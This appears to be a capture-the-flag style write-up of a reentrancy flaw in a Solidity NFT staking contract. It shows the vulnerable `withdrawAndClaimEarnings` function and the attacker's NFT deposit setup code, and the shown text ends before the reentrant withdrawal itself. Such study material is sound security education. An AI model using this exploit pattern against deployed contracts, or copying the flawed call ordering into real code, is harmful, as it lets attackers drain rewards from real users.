`RewardToken`: This is an ERC20 token contract with a maximum cap of 1000 tokens. At the start, it mints 100 tokens to the depositor.

```solidity
contract RewardToken is ERC20Capped {
    constructor(address depositor) ERC20("Token", "TK") ERC20Capped(1000e18) {
        ERC20._mint(depositor, 100e18);
    }
}
```

`NftToStake`: This is an ERC721 token contract which mints an NFT token to the attacker.

```solidity
contract NftToStake is ERC721 {
    constructor(address attacker) ERC721("NFT", "NFT") {
        _mint(attacker, 99);
    }
}
```

`Depositoor`: This is the contract that allows for staking NFTs. Users who stake their NFTs can earn rewards over time."

```solidity
contract Depositoor is IERC721Receiver {
    IERC721 public nft;
    IERC20 public rewardToken;
    uint256 public constant REWARD_RATE = 10e18 / uint256(1 days);
    // ...
}
```

# Vulnerability

The `Depositoor` contract has a significant vulnerability within its `withdrawAndClaimEarnings` function. This function first issues the reward tokens to the staker. Afterwards, it calls the `safeTransferFrom` function to return the staked NFT. Finally, it deletes the record of the staker's stake.

```solidity
function withdrawAndClaimEarnings(uint256 _tokenId) public {
    // Check if the tokenId provided by the caller matches the tokenId staked
    // by the sender, and if it is not 0 (indicating that a token has been staked).
    require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");

    // Call the payout function to calculate the amount of reward tokens
    // to distribute based on the length of time the NFT has been staked.
    payout(msg.sender);

    // Here's where the reentrancy vulnerability happens:
    // This call to safeTransferFrom can trigger arbitrary code execution
    // in the NFT contract (if it's maliciously crafted), allowing the caller
    // to reenter the function before stakes[msg.sender] is deleted.
    nft.safeTransferFrom(address(this), msg.sender, _tokenId);

    // Delete the stake record of the sender. But if a reentrancy attack happened,
    // the attacker may have already withdrawn their earnings twice!
    delete stakes[msg.sender];
}

```

The crucial issue arises because `safeTransferFrom` can potentially execute arbitrary code, which might end up triggering the `onERC721Received` function on the attacker's contract. As `safeTransferFrom` is invoked before the stake record is deleted, this opens up an opportunity for a reentrancy attack."

# Exploit

The attacker uses the depositNFT function to stake their NFT in the Depositoor contract.

```solidity
function depositNFT(
    address _nftToStake,
    address _stakingContract,
    address _rewardTokenContract
) external {
    // Initialize contract addresses for interaction.
    // This sets up the staking contract and the NFT to be staked for the exploit.
    stakingContract = Depositoor(_stakingContract);
    nftToStake = IERC721(_nftToStake);
    rewardTokenContract = IERC20(_rewardTokenContract);

    // The attacker contract approves the staking contract to move the attacker's NFT.
    // The approval is given for a specific tokenID, which will be used later for the reentrancy attack.
    nftToStake.approve(address(stakingContract), tokenId);

    // Transfer the approved NFT to the staking contract.
    // This action sets up the stage for the reentrancy attack as it stakes the NFT in the staking contract.
    // The NFT now resides in the staking contract and is ready to be "unstaked" with a reentrancy attack to drain tokens.
    nftToStake.safeTransferFrom(
        address(this),
        address(stakingContract),
        tokenId
    );
}
```

This function's purpose is to set up the conditions necessary for the reentrancy exploit to work. It stakes the NFT into the `Depositoor` contract, making it ready for the subsequent call to `withdrawAndClaimEarnings`.
